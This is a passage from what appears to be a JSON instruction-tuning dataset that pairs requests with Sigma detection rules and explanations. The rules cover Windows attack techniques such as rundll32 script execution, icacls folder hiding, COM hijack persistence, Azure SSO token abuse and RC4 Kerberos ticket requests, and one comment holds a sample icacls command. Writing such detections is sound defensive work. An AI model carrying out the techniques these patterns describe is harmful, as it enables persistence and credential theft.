    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains: ' /lockscreenurl:'\n    selection1_filter:\n        CommandLine|contains:\n            - '.jpg'\n            - '.jpeg'\n            - '.png'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'reg delete'\n            - '\\PersonalizationCSP'\n    condition: ( selection1 and not selection1_filter ) or selection_reg\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains: ' /lockscreenurl:'\n    selection1_filter:\n        CommandLine|contains:\n            - '.jpg'\n            - '.jpeg'\n            - '.png'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'reg delete'\n            - '\\PersonalizationCSP'\n    condition: ( selection1 and not selection1_filter ) or selection_reg\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high\n",
      "question": "suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet",
      "answer": "In order to detect a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet, you should focus on monitoring process creation events within Windows environments. Specifically, look for the execution of commands that attempt to change the lockscreen URL without specifying typical image file extensions like '.jpg', '.jpeg', or '.png'. This activity might indicate an attempt to misuse the functionality for downloading potentially malicious content from the Internet. Additionally, be on the alert for operations that involve deleting registry entries related to 'PersonalizationCSP', as this could be an attempt to remove traces of the lockscreen customization, thus further indicating suspicious behavior. Pay close attention to both the command line and parent command line fields for evidence of such activity. However, be mindful that there could be legitimate uses of these commands depending on the scripts and administrative tools employed within your IT environment, which means there might be instances that these detections are false positives. The importance of these detections is considered high due to the potential misuse of Windows features for malicious purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious process related to rundll32 based on arguments.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious process related to rundll32 based on arguments, you should: Focus on monitoring the creation of processes on Windows systems. Specifically, watch for the command line invocation of 'rundll32', a legitimate Windows command, which is being misused in this context. Pay attention to command line arguments that include either 'mshtml,RunHTMLApplication', 'mshtml,#135', which indicate an attempt to execute HTML applications or scripts, a common technique in various attacks. Additionally, be wary of command lines containing 'javascript:' or 'vbscript:', as these are scripting languages often used maliciously when combined with 'rundll32' to execute code directly in memory or perform other unauthorized actions. Remember that false positives may arise from legitimate administration scripts or tools, so these detections should be considered within the context of your environment's normal behavior. The detection of such activities is crucial in identifying and mitigating attacks that leverage 'rundll32' for malicious purposes, falling under tactics and techniques that involve the abuse of system features and scripted languages to execute commands, conduct reconnaissance, or achieve execution persistence.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains: 'rundll32'\n    selection2:\n        CommandLine|contains: \n            - 'mshtml,RunHTMLApplication'\n            - 'mshtml,#135'\n    selection3:\n        CommandLine|contains:\n            - 'javascript:'\n            - 'vbscript:'\n    condition: all of selection*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains: 'rundll32'\n    selection2:\n        CommandLine|contains: \n            - 'mshtml,RunHTMLApplication'\n            - 'mshtml,#135'\n    selection3:\n        CommandLine|contains:\n            - 'javascript:'\n            - 'vbscript:'\n    condition: all of selection*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n",
      "question": "suspicious process related to rundll32 based on arguments",
      "answer": "In order to detect suspicious process related to rundll32 based on arguments, you should: Focus on monitoring the creation of processes on Windows systems. Specifically, watch for the command line invocation of 'rundll32', a legitimate Windows command, which is being misused in this context. Pay attention to command line arguments that include either 'mshtml,RunHTMLApplication', 'mshtml,#135', which indicate an attempt to execute HTML applications or scripts, a common technique in various attacks. Additionally, be wary of command lines containing 'javascript:' or 'vbscript:', as these are scripting languages often used maliciously when combined with 'rundll32' to execute code directly in memory or perform other unauthorized actions. Remember that false positives may arise from legitimate administration scripts or tools, so these detections should be considered within the context of your environment's normal behavior. The detection of such activities is crucial in identifying and mitigating attacks that leverage 'rundll32' for malicious purposes, falling under tactics and techniques that involve the abuse of system features and scripted languages to execute commands, conduct reconnaissance, or achieve execution persistence."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section, you should: Monitor the process creation logs in Windows systems for any instances where the process 'C:\\Windows\\System32\\wpbbin.exe' is initiated. This specific file execution is associated with sophisticated persistence mechanisms that leverage the Unified Extensible Firmware Interface (UEFI), making it a critical point of detection for potential security breaches. Given the nature of this detection, it's tagged with tactics and techniques commonly observed in system persistence efforts and may include manipulation of UEFI firmware. Be aware that there are scenarios where this file may be legitimately used, particularly by certain hardware manufacturers like Lenovo. Therefore, while this detection is set to a high level of alert, it's important to investigate the context of its execution to rule out false positives associated with valid usage.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image: 'C:\\Windows\\System32\\wpbbin.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the file by hardware manufacturer such as lenovo (Thanks @0gtweet for the tip)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image: 'C:\\Windows\\System32\\wpbbin.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the file by hardware manufacturer such as lenovo (Thanks @0gtweet for the tip)\nlevel: high\n",
      "question": "execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section",
      "answer": "In order to detect execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section, you should: Monitor the process creation logs in Windows systems for any instances where the process 'C:\\Windows\\System32\\wpbbin.exe' is initiated. This specific file execution is associated with sophisticated persistence mechanisms that leverage the Unified Extensible Firmware Interface (UEFI), making it a critical point of detection for potential security breaches. Given the nature of this detection, it's tagged with tactics and techniques commonly observed in system persistence efforts and may include manipulation of UEFI firmware. Be aware that there are scenarios where this file may be legitimately used, particularly by certain hardware manufacturers like Lenovo. Therefore, while this detection is set to a high level of alert, it's important to investigate the context of its execution to rule out false positives associated with valid usage."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious program execution in a web service root folder (filter out false positives).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious program execution in a web service root folder (filter out false positives), you should: Monitor for the creation of processes on Windows systems, paying special attention to those initiated from directories commonly associated with web services, such as '\\wwwroot\\', '\\wmpub\\', and '\\htdocs\\'. It's important to exclude processes that are started from less suspicious directories often used for legitimate purposes, like 'bin\\', '\\Tools\\', and '\\SMSComponent\\'. Also, ensure the process wasn't started by 'services.exe' as its parent process to reduce the risk of false positives which might occur from routine operations or the usage of common diagnostic tools that include commands like ping or nslookup. Focus on logging and examining both the command line used to initiate the process and the parent process's command line to more accurately identify and assess potential threats. This approach is tagged with tactics and techniques that typically involve execution and persistence through web servers, aiming to medium level threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|contains:\n            - '\\wwwroot\\'\n            - '\\wmpub\\'\n            - '\\htdocs\\'\n    filter:\n        Image|contains:\n            - 'bin\\'\n            - '\\Tools\\'\n            - '\\SMSComponent\\'\n        ParentImage|endswith: '\\services.exe'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Various applications\n    - Tools that include ping or nslookup command invocations\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|contains:\n            - '\\wwwroot\\'\n            - '\\wmpub\\'\n            - '\\htdocs\\'\n    filter:\n        Image|contains:\n            - 'bin\\'\n            - '\\Tools\\'\n            - '\\SMSComponent\\'\n        ParentImage|endswith: '\\services.exe'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Various applications\n    - Tools that include ping or nslookup command invocations\nlevel: medium\n",
      "question": "suspicious program execution in a web service root folder (filter out false positives)",
      "answer": "In order to detect a suspicious program execution in a web service root folder (filter out false positives), you should: Monitor for the creation of processes on Windows systems, paying special attention to those initiated from directories commonly associated with web services, such as '\\wwwroot\\', '\\wmpub\\', and '\\htdocs\\'. It's important to exclude processes that are started from less suspicious directories often used for legitimate purposes, like 'bin\\', '\\Tools\\', and '\\SMSComponent\\'. Also, ensure the process wasn't started by 'services.exe' as its parent process to reduce the risk of false positives which might occur from routine operations or the usage of common diagnostic tools that include commands like ping or nslookup. Focus on logging and examining both the command line used to initiate the process and the parent process's command line to more accurately identify and assess potential threats. This approach is tagged with tactics and techniques that typically involve execution and persistence through web servers, aiming to medium level threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect use of icacls to deny access for everyone in Users folder sometimes used to hide malicious files.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect use of icacls to deny access for everyone in Users folder, sometimes used to hide malicious files, you should monitor for the creation of processes related to the execution of the 'icacls.exe' command, specifically under the Windows operating system. Look for instances where the original file name is marked as 'iCACLS.EXE' or the image path ends with '\\icacls.exe'. Additionally, pay close attention to the command line parameters, particularly commands that include paths starting with 'C:\\Users\\', coupled with the '/deny' parameter and the security identifier '*S-1-1-0:', which corresponds to denying access to the \"Everyone\" group. This combination of path, option, and identifier is a strong indicator that icacls is being used with potentially malicious intent, specifically to modify permissions in the User's folder to conceal unauthorized files. It's worth noting that there may be legitimate uses for these commands, so it is essential to consider the context in which they are being executed to reduce the number of false positives. The detection is based on process creation logs, making it critical to have a comprehensive logging mechanism on Windows machines to effectively monitor and react to such activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_icacls:\n        - OriginalFileName: 'iCACLS.EXE'\n        - Image|endswith: '\\icacls.exe'\n    selection_cmd: #icacls \"C:\\Users\\admin\\AppData\\Local\\37f92fe8-bcf0-4ee0-b8ba-561f797f5696\" /deny *S-1-1-0:(OI)(CI)(DE,DC)\n        CommandLine|contains|all:\n            - 'C:\\Users\\'\n            - '/deny'\n            - '*S-1-1-0:'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_icacls:\n        - OriginalFileName: 'iCACLS.EXE'\n        - Image|endswith: '\\icacls.exe'\n    selection_cmd: #icacls \"C:\\Users\\admin\\AppData\\Local\\37f92fe8-bcf0-4ee0-b8ba-561f797f5696\" /deny *S-1-1-0:(OI)(CI)(DE,DC)\n        CommandLine|contains|all:\n            - 'C:\\Users\\'\n            - '/deny'\n            - '*S-1-1-0:'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
      "question": "Detect use of icacls to deny access for everyone in Users folder sometimes used to hide malicious files",
      "answer": "In order to detect use of icacls to deny access for everyone in Users folder, sometimes used to hide malicious files, you should monitor for the creation of processes related to the execution of the 'icacls.exe' command, specifically under the Windows operating system. Look for instances where the original file name is marked as 'iCACLS.EXE' or the image path ends with '\\icacls.exe'. Additionally, pay close attention to the command line parameters, particularly commands that include paths starting with 'C:\\Users\\', coupled with the '/deny' parameter and the security identifier '*S-1-1-0:', which corresponds to denying access to the \"Everyone\" group. This combination of path, option, and identifier is a strong indicator that icacls is being used with potentially malicious intent, specifically to modify permissions in the User's folder to conceal unauthorized files. It's worth noting that there may be legitimate uses for these commands, so it is essential to consider the context in which they are being executed to reduce the number of false positives. The detection is based on process creation logs, making it critical to have a comprehensive logging mechanism on Windows machines to effectively monitor and react to such activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting changes to the PSFactory COM InProcServer32 registry. This technique was used by RomCom to create persistence storing a malicious DLL..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes to the PSFactory COM InProcServer32 registry, a technique used by RomCom to create persistence by storing a malicious DLL, you should: Focus on monitoring registry modifications, specifically focusing on the Windows platform. The key aspect of this detection approach involves identifying events where the \"SetValue\" operation is carried out on registry keys. Specifically, the registry key to watch is the one ending with '\\CLSID\\{c90250f3-4d7d-4991-9b69-a5c5bc1c2ae6}\\InProcServer32\\(Default)'. However, to avoid false alarms and ensure the accuracy of detection, modifications involving the standard Windows path to 'ActXPrxy.dll', being either '%windir%\\System32\\ActXPrxy.dll' or 'C:\\Windows\\System32\\ActXPrxy.dll', should not trigger alerts. These paths represent legitimate events that are not indicative of the malicious activity described. The absence of known benign activities causing similar changes creates an uncertainty around potential false positives, thereby warranting a high level of scrutiny for any alerts generated based on these criteria. This focused approach is essential for identifying attempts to achieve persistence by inserting a malicious DLL, a method commonly associated with sophisticated cyber threats like RomCom, within targeted systems.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\CLSID\\{c90250f3-4d7d-4991-9b69-a5c5bc1c2ae6}\\InProcServer32\\(Default)'\n    filter_main:\n        Details:\n            - '%windir%\\System32\\ActXPrxy.dll'\n            - 'C:\\Windows\\System32\\ActXPrxy.dll'\n    condition: selection and not filter_main\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\CLSID\\{c90250f3-4d7d-4991-9b69-a5c5bc1c2ae6}\\InProcServer32\\(Default)'\n    filter_main:\n        Details:\n            - '%windir%\\System32\\ActXPrxy.dll'\n            - 'C:\\Windows\\System32\\ActXPrxy.dll'\n    condition: selection and not filter_main\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "changes to the PSFactory COM InProcServer32 registry. This technique was used by RomCom to create persistence storing a malicious DLL.",
      "answer": "In order to detect changes to the PSFactory COM InProcServer32 registry, a technique used by RomCom to create persistence by storing a malicious DLL, you should: Focus on monitoring registry modifications, specifically focusing on the Windows platform. The key aspect of this detection approach involves identifying events where the \"SetValue\" operation is carried out on registry keys. Specifically, the registry key to watch is the one ending with '\\CLSID\\{c90250f3-4d7d-4991-9b69-a5c5bc1c2ae6}\\InProcServer32\\(Default)'. However, to avoid false alarms and ensure the accuracy of detection, modifications involving the standard Windows path to 'ActXPrxy.dll', being either '%windir%\\System32\\ActXPrxy.dll' or 'C:\\Windows\\System32\\ActXPrxy.dll', should not trigger alerts. These paths represent legitimate events that are not indicative of the malicious activity described. The absence of known benign activities causing similar changes creates an uncertainty around potential false positives, thereby warranting a high level of scrutiny for any alerts generated based on these criteria. This focused approach is essential for identifying attempts to achieve persistence by inserting a malicious DLL, a method commonly associated with sophisticated cyber threats like RomCom, within targeted systems."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when ForceV1 asks for information directly from the kernel space, and Conhost connects to the console application, with the implication that the process is running with elevated privileges such as in an Administrator context, you should: Monitor Windows process creation logs for any instance where a process is created with a High Integrity Level, and its command line includes all of the following elements: 'conhost.exe', '0xffffffff', and '-ForceV1'. These elements indicate an operation that directly interacts with kernel space, which could be suspect if not part of standard administrative tasks. However, it's essential to note that detecting this activity can result in very likely false positives, especially in cases where cmd.exe is launched with administrative privileges. This detection is mainly for informational purposes to highlight potential areas of concern rather than definitive malicious activity without further context.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        IntegrityLevel: 'High'\n        CommandLine|contains|all:\n            - 'conhost.exe'\n            - '0xffffffff'\n            - '-ForceV1'\n    condition: selection\nfalsepositives:\n    - Very Likely, including launching cmd.exe via Run As Administrator\nlevel: informational\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        IntegrityLevel: 'High'\n        CommandLine|contains|all:\n            - 'conhost.exe'\n            - '0xffffffff'\n            - '-ForceV1'\n    condition: selection\nfalsepositives:\n    - Very Likely, including launching cmd.exe via Run As Administrator\nlevel: informational\n",
      "question": "ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context.",
      "answer": "In order to detect when ForceV1 asks for information directly from the kernel space, and Conhost connects to the console application, with the implication that the process is running with elevated privileges such as in an Administrator context, you should: Monitor Windows process creation logs for any instance where a process is created with a High Integrity Level, and its command line includes all of the following elements: 'conhost.exe', '0xffffffff', and '-ForceV1'. These elements indicate an operation that directly interacts with kernel space, which could be suspect if not part of standard administrative tasks. However, it's essential to note that detecting this activity can result in very likely false positives, especially in cases where cmd.exe is launched with administrative privileges. This detection is mainly for informational purposes to highlight potential areas of concern rather than definitive malicious activity without further context."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting abusing Azure Browser SSO by requesting OAuth 2.0 refresh tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account) wanting to perform SSO authentication in the browser.\nAn attacker can use this to authenticate to Azure AD in a browser as that user.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect abusing Azure Browser SSO by requesting OAuth 2.0 refresh tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account) wanting to perform SSO authentication in the browser. An attacker can use this to authenticate to Azure AD in a browser as that user, you should: monitor for the loading of the MicrosoftAccountTokenProvider.dll from the C:\\Windows\\System32 directory on Windows systems. This detection is based on the premise that during an attack attempting to exploit Azure Browser SSO for unauthorized authentication via OAuth 2.0 refresh tokens, the MicrosoftAccountTokenProvider.dll would be crucial since it is linked to handling of Microsoft account tokens.\n\nTo refine the detection and minimize false positives, it's advisable to exclude events where the loaded images are part of legitimate background tasks, including tasks started by BackgroundTaskHost.exe located either in the System32 or SysWOW64 directories. Similarly, activities initiated by recognized developer tools like Microsoft Visual Studio, browsers such as Internet Explorer or Microsoft Edge, as well as OneDrive, should also be considered as exceptions unless other suspicious activities correlate.\n\nThis monitoring strategy leverages the understanding that simply loading the said DLL can occur in non-malicious scenarios. Therefore, alerting on this event alone is classified with a low-level severity. It is most effective when this activity is correlated with other suspicious actions that could indicate an attack aimed at misusing Azure Browser SSO features to gain unauthorized access. The tags associated with this attack would relate to techniques that abuse legitimate authentication processes to perform unauthorized actions, reflecting an exploitation of trusted processes for malicious purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded: 'C:\\Windows\\System32\\MicrosoftAccountTokenProvider.dll'\n    filter_main_bgtaskhost:\n        Image|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n        Image|endswith: '\\BackgroundTaskHost.exe'\n        #CommandLine|contains: '-ServerNameBackgroundTaskHost.WebAccountProvider'\n    filter_optional_devenv:\n        Image|startswith:\n            - 'C:\\Program Files\\Microsoft Visual Studio\\'\n            - 'C:\\Program Files (x86)\\Microsoft Visual Studio\\'\n        Image|endswith: '\\IDE\\devenv.exe'\n    filter_optional_ie:\n        Image:\n            - 'C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe'\n            - 'C:\\Program Files\\Internet Explorer\\iexplore.exe'\n    filter_optional_edge_1:\n        - Image|startswith: 'C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\'\n        - Image|endswith: '\\WindowsApps\\MicrosoftEdge.exe'\n        - Image:\n            - 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'\n            - 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe'\n    filter_optional_edge_2:\n        Image|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft\\EdgeCore\\'\n            - 'C:\\Program Files\\Microsoft\\EdgeCore\\'\n        Image|endswith:\n            - '\\msedge.exe'\n            - '\\msedgewebview2.exe'\n    filter_optional_onedrive:\n        Image|endswith: '\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe'\n    filter_optional_null:\n        Image: null\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - False positives are expected since this rules is only looking for the DLL load event. This rule is better used in correlation with related activity\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded: 'C:\\Windows\\System32\\MicrosoftAccountTokenProvider.dll'\n    filter_main_bgtaskhost:\n        Image|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n        Image|endswith: '\\BackgroundTaskHost.exe'\n        #CommandLine|contains: '-ServerNameBackgroundTaskHost.WebAccountProvider'\n    filter_optional_devenv:\n        Image|startswith:\n            - 'C:\\Program Files\\Microsoft Visual Studio\\'\n            - 'C:\\Program Files (x86)\\Microsoft Visual Studio\\'\n        Image|endswith: '\\IDE\\devenv.exe'\n    filter_optional_ie:\n        Image:\n            - 'C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe'\n            - 'C:\\Program Files\\Internet Explorer\\iexplore.exe'\n    filter_optional_edge_1:\n        - Image|startswith: 'C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\'\n        - Image|endswith: '\\WindowsApps\\MicrosoftEdge.exe'\n        - Image:\n            - 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'\n            - 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe'\n    filter_optional_edge_2:\n        Image|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft\\EdgeCore\\'\n            - 'C:\\Program Files\\Microsoft\\EdgeCore\\'\n        Image|endswith:\n            - '\\msedge.exe'\n            - '\\msedgewebview2.exe'\n    filter_optional_onedrive:\n        Image|endswith: '\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe'\n    filter_optional_null:\n        Image: null\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - False positives are expected since this rules is only looking for the DLL load event. This rule is better used in correlation with related activity\nlevel: low\n",
      "question": "abusing Azure Browser SSO by requesting OAuth 2.0 refresh tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account) wanting to perform SSO authentication in the browser.\nAn attacker can use this to authenticate to Azure AD in a browser as that user.\n",
      "answer": "In order to detect abusing Azure Browser SSO by requesting OAuth 2.0 refresh tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account) wanting to perform SSO authentication in the browser. An attacker can use this to authenticate to Azure AD in a browser as that user, you should: monitor for the loading of the MicrosoftAccountTokenProvider.dll from the C:\\Windows\\System32 directory on Windows systems. This detection is based on the premise that during an attack attempting to exploit Azure Browser SSO for unauthorized authentication via OAuth 2.0 refresh tokens, the MicrosoftAccountTokenProvider.dll would be crucial since it is linked to handling of Microsoft account tokens.\n\nTo refine the detection and minimize false positives, it's advisable to exclude events where the loaded images are part of legitimate background tasks, including tasks started by BackgroundTaskHost.exe located either in the System32 or SysWOW64 directories. Similarly, activities initiated by recognized developer tools like Microsoft Visual Studio, browsers such as Internet Explorer or Microsoft Edge, as well as OneDrive, should also be considered as exceptions unless other suspicious activities correlate.\n\nThis monitoring strategy leverages the understanding that simply loading the said DLL can occur in non-malicious scenarios. Therefore, alerting on this event alone is classified with a low-level severity. It is most effective when this activity is correlated with other suspicious actions that could indicate an attack aimed at misusing Azure Browser SSO features to gain unauthorized access. The tags associated with this attack would relate to techniques that abuse legitimate authentication processes to perform unauthorized actions, reflecting an exploitation of trusted processes for malicious purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting service ticket requests using RC4 encryption type.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect service ticket requests using RC4 encryption type, you should focus on Windows security event logs. Specifically, monitor for event ID 4769, which indicates a service ticket request. The detection hinges on identifying instances where the ticket options field equals '0x40810000' and the ticket encryption type field is set to '0x17', which corresponds to RC4 encryption. However, it's important to filter out and not alert on events where the service name ends with a '$' sign, as these are often legitimate service account activities, particularly on legacy systems or within Windows Domains with Domain Functional Level (DFL) 2003. Be aware of potential false positives, especially concerning service accounts used on legacy systems like NetApp, or in environments with older Windows Domain configurations. The severity level for this activity is considered medium, indicating it's important but not an immediate critical threat. This approach is aligned with understanding the usage of deprecated or less secure encryption types in service ticket requests, which can be indicative of an attacker's attempt to exploit weaker encryption for credential access or lateral movement within a network.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4769\n        TicketOptions: '0x40810000'\n        TicketEncryptionType: '0x17'\n    reduction:\n        ServiceName|endswith: '$'\n    condition: selection and not reduction\nfalsepositives:\n    - Service accounts used on legacy systems (e.g. NetApp)\n    - Windows Domains with DFL 2003 and legacy systems\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4769\n        TicketOptions: '0x40810000'\n        TicketEncryptionType: '0x17'\n    reduction:\n        ServiceName|endswith: '$'\n    condition: selection and not reduction\nfalsepositives:\n    - Service accounts used on legacy systems (e.g. NetApp)\n    - Windows Domains with DFL 2003 and legacy systems\nlevel: medium\n",
      "question": "service ticket requests using RC4 encryption type",
      "answer": "In order to detect service ticket requests using RC4 encryption type, you should focus on Windows security event logs. Specifically, monitor for event ID 4769, which indicates a service ticket request. The detection hinges on identifying instances where the ticket options field equals '0x40810000' and the ticket encryption type field is set to '0x17', which corresponds to RC4 encryption. However, it's important to filter out and not alert on events where the service name ends with a '$' sign, as these are often legitimate service account activities, particularly on legacy systems or within Windows Domains with Domain Functional Level (DFL) 2003. Be aware of potential false positives, especially concerning service accounts used on legacy systems like NetApp, or in environments with older Windows Domain configurations. The severity level for this activity is considered medium, indicating it's important but not an immediate critical threat. This approach is aligned with understanding the usage of deprecated or less secure encryption types in service ticket requests, which can be indicative of an attacker's attempt to exploit weaker encryption for credential access or lateral movement within a network."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated Powershell via VAR++ LAUNCHER.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated PowerShell via VAR++ LAUNCHER, you should focus on monitoring Windows System logs, specifically looking for events generated by the Service Control Manager with an EventID of 7045. This EventID indicates a service was installed on the system, which can be a normal occurrence. However, the critical aspect to scrutinize is the 'ImagePath' attribute within these events, as attackers often manipulate this to execute malicious PowerShell scripts using obfuscation techniques to evade detection.\n\nLook for 'ImagePath' values that contain a combination of certain patterns and characters, indicating a high likelihood of obfuscated PowerShell commands. Specifically, you should search for occurrences that have:\n\n- The presence of '&&set' followed by 'cmd' and '/c' indicating the execution of a command following the setting of environment variables.\n- The '-f' format operator, which in these contexts is likely used for string manipulation or to format commands in a way that masks their intentions.\n- The use of manipulated braces '{ }', specifically containing numeric placeholders like '{0}', '{1}', '{2}', '{3}', '{4}', '{5}', indicating an attempt to reorder or format strings in a way that might not be immediately apparent, contributing to the obfuscation.\n\nIt's these patterns of string manipulation and command formatting that hint at the obfuscation tactics used to disguise the intended actions of PowerShell scripts, making them less conspicuous to standard detection mechanisms.\n\nIt is important, however, to approach detections with caution as there might be unknown false positives. Given that these detection methods are based on behavior that could potentially be replicated in non-malicious contexts, any alerts should warrant a further investigation rather than immediate action. The level of concern for detections matching these patterns is high, underscoring the necessity for immediate investigation upon detection.",
    "context": "",
